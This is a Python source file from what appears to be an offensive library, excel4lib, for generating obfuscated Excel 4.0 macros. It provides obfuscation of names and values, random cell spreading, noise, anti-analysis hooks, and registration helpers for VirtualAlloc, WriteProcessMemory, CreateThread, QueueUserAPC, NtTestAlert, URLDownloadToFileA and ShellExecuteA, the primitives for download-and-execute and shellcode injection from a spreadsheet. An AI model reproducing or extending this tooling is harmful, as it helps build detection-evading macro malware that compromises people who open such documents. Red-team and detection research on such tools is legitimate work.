from excel4lib.sheet import *
from .excel4_instruction import *
from .excel4_formula import *
from .excel4_variable import *
from .excel4_value import *
from .excel4_argument import *
from .excel4_register_formula import *
from excel4lib.config import *
from .excel4_argument import *

class Excel4Macro(object):
    '''
    Allows to create obfusacted Excel 4.0 Macro.

    During creating macro probably you will need a few things:
    - a way to define variables, formulas;
    - obfuscation;
    - dumping results to file.

    `Excel4Macro` class shares some basic functions which allow to do this:
    - `Excel4Macro.formula`, `Excel4Macro.variable`;
    - `Excel4Macro.obfuscate_all`;
    - `Excel4Macro.to_csv_file`.

    Creating simple macro with variable and formula:
    ```
    from excel4lib.macro import *

    macro = Excel4Macro("test.csv")
    cmd = macro.variable("cmd", "calc.exe")
    macro.formula("EXEC", cmd)
    print(macro.to_csv())
    ```

    As you can see macro.variable function returns object that could be used as argument
    in macro.formula function. This is the main idea of this library. Excel4 formulas, variables,
    values and formula arguments are represented as python objects. Thanks to that you can create your
    macro once and then dynamicly change attributes of thi objects, for example names of variables,
    values of variables or even addresses.
    '''

    def __init__(self, name, obfuscator = None, analysis = None, routines=None):
        '''

        :param name: name of the macro

        :param obfuscator: Excel4Obfuscator object to use during obfuscation process

        :param analysis: Excel4AntiAnalysis object that allows to add anti-analysis instructions to the worksheet

        :param routines: Excel4Routines object that allows to add additional macros
        '''
        self.name = name
        self.worksheet = Worksheet(name)
        self.obfuscator = obfuscator
        self.analysis = analysis
        self.routines = routines

        if self.obfuscator:
            self.obfuscator.set_macro(self)
        if self.analysis:
            self.analysis.set_macro(self)
        if self.routines:
            self.routines.set_macro(self)

        # List of Excel4 instructions ordered by execution. Instructions should be called in this order.
        self.ordered_calls = []
        self.obfuscated_formulas = []

        self.automatic_obfuscate = Excel4Config.obfuscator.automatic_obfuscation

        self.config = Excel4Config
        # Auto_Open or Auto_Close cell cords
        self.trigger_x = 1
        self.trigger_y = 1

    def set_cords(self, x=None, y=None):
        '''
        Sets active cell(current cords) to x,y.

        :param x: column

        :param y: row
        '''
        if not x:
            x = self.worksheet._curr_x
        if not y:
            y = self.worksheet._curr_y
        self.worksheet.set_current_cords(x,y)

    def set_trigger_cords(self, x, y):
        '''
        Sets column and row in which auto open or auto close function will be used.

        :param x: number of column

        :param y: number of row
        '''
        self.trigger_x = x
        self.trigger_y = y

    def to_csv(self):
        '''
        Dumps macro to CSV format

        :return: macro as CSV string
        '''
        self.obfuscate_all()
        return self.worksheet.to_csv(Excel4Config.csv_separator)

    def to_csv_file(self, filename=None):
        '''
        Saves macro to CSV file

        :param filename: output filename if None then it is set to `name` of the macro
        '''
        if not filename:
            filename = self.name + ".csv"
        write_file(filename, self.to_csv())

    def _reserve_cells(self, x, y, amount):
        '''
        Reserves cells from (x, y+amount). Returns reserved cells

        :param x: column

        :param y: row

        :param amount: number of cells to reserve

        :return: list of Excel4Value formulas that reserves specified space
        '''
        formulas = []
        if self.worksheet.is_reserved(x, y, amount):
            # If we cant reserve then return empty list
            return formulas

        for i in range(0, amount):
            formulas.append(Excel4Value(x,y+amount))
            self.worksheet.add_cell(formulas[i])

        return formulas


    def random_add_to_worksheet(self, formulas):
        '''
        Adds formulas to the worksheet at random place

        :param formulas: list of formulas to add
        '''
        # Backup cords
        curr_x, curr_y = self.worksheet.get_current_cords()
        # Find place where formulas could be placed
        target_x, target_y = self._gen_random_cords(len(formulas))
        # Add to the worksheet
        for f in formulas:
            f.x = target_x
            f.y = target_y
            self._add_to_worksheet(f)
            target_y = target_y + 1
        # Restore cords
        self.worksheet.set_current_cords(curr_x, curr_y)

    def _add_to_worksheet(self, cell):
        '''
        Adds formula to the worksheet

        :param cell: formula to add
        '''
        if not issubclass(type(cell), Cell):
            pass
        self.worksheet.add_cell(cell)
        self.ordered_calls.append(cell)


    def _create_logical_test(self, value1, operator, value2):
        '''
        Creates Excel4LogicalTest object. Created object is not added to the worksheet.

        :param value1: first value

        :param operator: operator to use

        :param value2: second value

        :return: Excel4LogicalTest object
        '''
        o = Excel4LogicalTest(value1, operator, value2)
        return o

    def _create_argument_object(self, instruction, *args):
        '''
        Creates Excel4FormulaArgument object. Created object is not added to the worksheet

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4FormulaArgument object
        '''
        o = Excel4FormulaArgument(instruction, *args)
        return o

    def _create_formula(self, x, y, instruction, *args):
        '''
        Creates Excel4Formula object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4Formula object
        '''
        o = Excel4Formula(x, y,  instruction, *args)
        return o

    def _create_go_to(self, x, y, formula):
        '''
        Creates Excel4GoToFormula object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param formula: the formula to which to direct the macro execution

        :return: Excel4GoToFormula object
        '''
        instruction_name = Excel4InstructionName("GOTO")
        instruction_name.translate = True
        o = Excel4GoToFormula(x, y, instruction_name, formula)
        return o

    def _create_loop(self, x, y, instruction, *args):
        '''
        Creates Excel4LoopFormula object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4LoopFormula object
        '''
        o = Excel4LoopFormula(x, y,  instruction, *args)
        return o

    def _create_condition(self, x, y, instruction, *args):
        '''
        Creates Excel4ConditionFormula object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4ConditionFormula object
        '''
        o = Excel4ConditionFormula(x, y,  instruction, *args)
        return o

    def _create_end_loop(self, x, y, instruction, *args):
        '''
        Creates Excel4EndLoopFormula object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4EndLoopFormula object
        '''
        o = Excel4EndLoopFormula(x, y,  instruction, *args)
        return o

    def _create_value(self, x, y, value):
        '''
        Creates Excel4Value object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param value:

        :return: Excel4Value object
        '''
        o = Excel4Value(x, y, value)
        return o

    def _create_variable(self, x, y, name, value):
        '''
        Creates Excel4Variable object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4Variable object
        '''
        o = Excel4Variable(x, y,  name, value)
        return o

    def _create_register(self, x, y, dll_name, exported_function, type_text, function_text=""):
        '''
        Creates Excel4RegisterFormula object. Created object is not added to the worksheet

        :param x: column

        :param y: row

        :param dll_name: name of a DLL

        :param exported_function: name of exported function that you want to import

        :param type_text:  string representing the types of return value and arguments of function that you want to import;

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated

        :return: Excel4RegisterFormula object
        '''
        # Generate random function_text if it's empty
        if not function_text:
            function_text = random_string(random.randint(4, 8))
        formula = Excel4RegisterFormula(x, y, dll_name, exported_function, type_text, function_text)
        return formula

    def obfuscate_all(self):
        '''
        Obfuscates macro.

        Obfuscation process is splitted into few steps:

        - obfuscation of variables names;
        - obfuscation of function names;
        - spread formulas across worksheet;
        - add noise;
        - obfuscation of values;
        - obfuscation of formulas with arguments;
        '''
        if (not self.obfuscator) or (not self.config.obfuscator.enable):
            return
        # Set language to native
        lang_b = Excel4Translator.language
        Excel4Translator.language = Excel4Translator.native_language

        # Change variable and values language
        if not self.config.obfuscator.translate:
            for f in self.ordered_calls:
                if issubclass(type(f), Excel4Value):
                    f.set_language(Excel4Translator.native_language)

        # Obfuscate variable names
        if self.config.obfuscator.obfuscate_variable_names:
            self._obfuscate_variable_names()

        # Obfuscate function names
        if self.config.obfuscator.obfuscate_registered_functions:
            self._obfuscate_function_names()

        if self.config.obfuscator.spread_cells:
            self._spread_cells()

        if self.config.obfuscator.generate_noise:
            self._generate_noise()

        if self.config.obfuscator.obfuscate_variable_values:
            self._obfuscate_variable_values()

        if self.config.obfuscator.obfuscate_formulas:
            self._obfuscate_formulas()
        Excel4Translator.language = lang_b

    def _spread_cells(self):
        '''
        Spreads cells across worksheet.
        '''
        if not self.obfuscator:
            return

        self.obfuscator._spread_formulas(self.trigger_x, self.trigger_y)

    def _generate_noise(self):
        '''
        Generates noise in worksheet. It's simply adds some random values in cells.
        '''
        if not self.obfuscator:
            return

        self.obfuscator._generate_noise()

    def _obfuscate_function_names(self):
        '''
        Obfuscates registered function names
        '''
        if not self.obfuscator:
            return

        for f in (self.ordered_calls):
            if not f._obfuscate:
                continue

            if issubclass(type(f), Excel4RegisterFormula):
                self.obfuscator.obfuscate_function_name(f)

    def _obfuscate_variable_names(self):
        '''
        Obfuscates variable names
        '''
        if not self.obfuscator:
            return

        for f in (self.ordered_calls):
            if not f._obfuscate:
                continue

            if issubclass(type(f), Excel4Variable):
                self.obfuscator.obfuscate_variable_name(f)



    def _obfuscate_variable_values(self):
        '''
        Obfuscates variable values
        '''
        if not self.obfuscator:
            return

        for f in (self.ordered_calls):
            if not f._obfuscate:
                continue

            if issubclass(type(f), Excel4Variable):
                # Obfuscate variable value
                obfuscated = self.obfuscator.obfuscate_variable_value(f)
                # obfuscated is a list of formulas that contains obfuscated value
                # last element is cell in which deobfuscated value will be placed
                # we need to add these formulas to worksheet, above variable initialization
                for o in obfuscated:
                    self.worksheet.add_above(o, f)

    def _obfuscate_formulas(self):
        '''
        Obfuscates formulas
        '''
        if not self.obfuscator:
            return
        self.obfuscator.obfuscate_formulas(self.ordered_calls)

    def logical(self, value1, operator, value2):
        '''
        Creates Excel4LogicalTest object and adds to the worksheet.

        :param value1: first value

        :param operator: operator to use

        :param value2: second value

        :return: Excel4LogicalTest object
        '''
        return self._create_logical_test(value1, operator, value2)

    def goto(self, jump):
        '''
        Creates Excel4GoToFormula object and adds to the worksheet.

        :param jump: the formula to which to direct the macro execution

        :return: Excel4GoToFormula object
        '''
        formula = self._create_go_to(self.worksheet._curr_x, self.worksheet._curr_y, jump)
        self._add_to_worksheet(formula)
        return formula

    def operator(self, value1, operator, value2):
        '''
        Creates Excel4LogicalTest object and adds to the worksheet.

        :param value1: first value

        :param operator: operator to use

        :param value2: second value

        :return: Excel4LogicalTest object
        '''
        return self._create_logical_test(value1, operator, value2)

    def argument(self, instruction, *args):
        '''
        Creates Excel4FormulaArgument object and adds to the worksheet.

        :param instruction: name of the instruction

        :param args: arguments of the insturction

        :return: Excel4FormulaArgument object
        '''
        if issubclass(type(instruction), Excel4RegisterFormula):
            instruction = instruction.get_function_text()
        return self._create_argument_object(instruction, *args)

    def value(self, value):
        '''
        Creates Excel4Value object and adds to the worksheet.

        :param value: value

        :return: Excel4Value object pointing to value
        '''
        # Create formula
        formula = self._create_value(self.worksheet._curr_x, self.worksheet._curr_y, value)
        self._add_to_worksheet(formula)
        return formula

    def variable(self, name, value):
        '''
        Creates Excel4Variable object and adds to the worksheet.

        :param name: name of the variable

        :param value: value of the variable

        :return: object pointing to variable definition
        '''
        # Create formula
        formula = self._create_variable(self.worksheet._curr_x, self.worksheet._curr_y, name, value)
        self._add_to_worksheet(formula)
        return formula

    def formula(self, formula, *args):
        '''
        Creates Excel4Formula object and adds to the worksheet.

        :param formula: name of the formula

        :param args: arguments of the formula

        :return: Excel4Formula object
        '''
        if issubclass(type(formula), Excel4RegisterFormula):
            formula = formula.get_function_text()
        if str(formula).lower() in ["for", "while"]:
            return self.loop(formula, args)
        elif str(formula).lower() in ["next"]:
            return self.end_loop(formula, args)
        elif str(formula).lower() in ["if"]:
            return self.condition(formula, args)
        elif str(formula).lower() in ["goto"]:
            if len(args) > 0:
                return self.goto(args[0])

        # Create formula
        formula = self._create_formula(self.worksheet._curr_x, self.worksheet._curr_y, formula, *args)
        self._add_to_worksheet(formula)
        return formula

    def loop(self, formula, *args):
        '''
        Creates Excel4LoopFormula object and adds to the worksheet.

        :param formula: name of the formula

        :param args: arguments of the formula

        :return: Excel4LoopFormula object
        '''
        if issubclass(type(formula), Excel4RegisterFormula):
            formula = formula.get_function_text()
        # Create formula
        formula = self._create_loop(self.worksheet._curr_x, self.worksheet._curr_y, formula, *args)
        self._add_to_worksheet(formula)
        return formula

    def condition(self, formula, *args):
        '''
        Creates Excel4ConditionFormula object and adds to the worksheet.

        :param formula: name of the formula

        :param args: arguments of the formula

        :return: Excel4ConditionFormula object
        '''
        if issubclass(type(formula), Excel4RegisterFormula):
            formula = formula.get_function_text()
        # Create formula
        formula = self._create_condition(self.worksheet._curr_x, self.worksheet._curr_y, formula, *args)
        self._add_to_worksheet(formula)
        return formula

    def end_loop(self, formula, *args):
        '''
        Creates Excel4EndLoopFormula object and adds to the worksheet.

        :param formula: name of the formula

        :param args: arguments of the formula

        :return: Excel4EndLoopFormula object
        '''
        if issubclass(type(formula), Excel4RegisterFormula):
            formula = formula.get_function_text()
        # Create formula
        formula = self._create_end_loop(self.worksheet._curr_x, self.worksheet._curr_y, formula, *args)
        self._add_to_worksheet(formula)
        return formula

    def empty(self):
        '''
        Creates empty cell

        :return: object pointing to empty cell
        '''
        # Create formula
        formula = self._create_value(self.worksheet._curr_x, self.worksheet._curr_y, "")
        # Add to worksheet
        self._add_to_worksheet(formula)
        return formula

    def register(self, dll_name, exported_function, type_text, function_text=""):
        '''
        Creates Register formula and adds to the worksheet.

        :param dll_name: name of a DLL

        :param exported_function: name of exported function that you want to import

        :param type_text:  string representing the types of return value and arguments of function that you want to import;

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated

        :return: Excel4RegisterFormula object
        '''
        formula = self._create_register(self.worksheet._curr_x, self.worksheet._curr_y, dll_name, exported_function, type_text, function_text)
        # Add to worksheet
        self._add_to_worksheet(formula)
        return formula

    def _create_check_architecture(self, x86_jump_formula, x64_jump_formula):
        '''
        Creates If formula that checks Excel architecture (x64 or x86)

        :param x86_jump_formula: jump to this formula if architecture is x86

        :param x64_jump_formula: jump to this formula if architecture is x64

        :return: IF formula object
        '''
        # Create formula IF(ISNUMBER(SEARCH("32", GET.WORKSPACE(1))), x86_jump, x64_jump)
        get_workspace = Excel4FormulaArgument("GET.WORKSPACE", 1)
        search = Excel4FormulaArgument("SEARCH", "32", get_workspace)
        isnumber = Excel4FormulaArgument("ISNUMBER", search)
        if_formula = self._create_condition(self.worksheet._curr_x, self.worksheet._curr_y, "IF", isnumber, x86_jump_formula, x64_jump_formula)
        return if_formula

    def check_architecture(self, x86_jump_formula, x64_jump_formula):
        '''
        Creates If formula that checks Excel architecture (x64 or x86) and adds it to worksheet

        :param x86_jump_formula: jump to this formula if architecture is x86

        :param x64_jump_formula: jump to this formula if architecture is x64

        :return: IF formula object
        '''
        formula = self._create_check_architecture(self.argument("GOTO", x86_jump_formula), self.argument("GOTO", x64_jump_formula))
        # Add to worksheet
        self._add_to_worksheet(formula)
        return formula

    def create_lang_detection(self, lang_num, true_jump, false_jump):
        '''
        Creates and returns language detection formula

        :param lang_num: number of language

        :param true_jump: jump if language is equal to lang_num

        :param false_jump: jump if language is diffrent than lang_num

        :return: IF formula object
        '''
        # Create formula =IF(INDEX(GET.WORKSPACE(37),1)<>lang_num,true_jump,false_jump)
        val1 = Excel4FormulaArgument("GET.WORKSPACE", 37)
        val1 = Excel4FormulaArgument("INDEX", val1, 1)
        cond = Excel4LogicalTest(val1, "<>", lang_num)
        if_formula = self._create_condition(self.worksheet._curr_x, self.worksheet._curr_y, "IF", cond, false_jump, true_jump)
        return if_formula

    def check_language(self, lang_num, true_jump, false_jump):
        formula = self.create_lang_detection(lang_num, true_jump, false_jump)
        self._add_to_worksheet(formula)
        return formula

    ''''
    WINAPI functions
    '''
    def register_virtual_alloc(self, function_text=""):
        '''
        Register VirtualAlloc function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated

        :return:
        '''
        return self.register("Kernel32", "VirtualAlloc", "JJJJJ", function_text)

    def register_write_process_memory(self, function_text=""):
        '''
        Register WriteProcessMemory function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("Kernel32", "WriteProcessMemory", "JJJCJJ", function_text)

    def register_create_thread(self, function_text=""):
        '''
        Register CreateThread function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("Kernel32", "CreateThread", "JJJJJJJ", function_text)

    def register_url_download_to_file_a(self, function_text=""):
        '''
        Register URLDownloadToFileA function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("urlmon", "URLDownloadToFileA", "JJCCJJ", function_text)

    def register_rtl_copy_memory(self, function_text=""):
        '''
        Register RtlCopyMemory function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("Kernel32", "RtlCopyMemory", "JJCJ", function_text)

    def register_queue_user_apc(self, function_text=""):
        '''
        Register QueueUserAPC function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("Kernel32", "QueueUserAPC", "JJJJ", function_text)

    def register_nt_test_alert(self, function_text=""):
        '''
        Register NtTestAlert function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("ntdll", "NtTestAlert", "J", function_text)

    def register_shell_execute(self, function_text=""):
        '''
        Register NtTestAlert function

        :param function_text: custom name of function that you want to import. If empty then it will be randomly generated
        '''
        return self.register("Shell32", "ShellExecuteA", "JJCCCJJ", function_text)

    def _gen_random_cords(self, height=2):
        '''
        Returns random cords

        :param height:
        '''
        target_x = random.randint(self.config.obfuscator.spread_x_min, self.config.obfuscator.spread_x_max)
        target_y = random.randint(self.config.obfuscator.spread_y_min, self.config.obfuscator.spread_y_max)
        fail_cnt = 0
        while self.worksheet.is_reserved(target_x, target_y, height + 1):
            if fail_cnt > 1000:
                self.config.obfuscator.spread_x_max = self.config.obfuscator.spread_x_max + 1
                target_x = self.config.obfuscator.spread_x_max
            else:
                target_x = random.randint(self.config.obfuscator.spread_x_min, self.config.obfuscator.spread_x_max)
            target_y = random.randint(self.config.obfuscator.spread_y_min, self.config.obfuscator.spread_y_max)
            fail_cnt = fail_cnt + 1

        return (target_x, target_y)



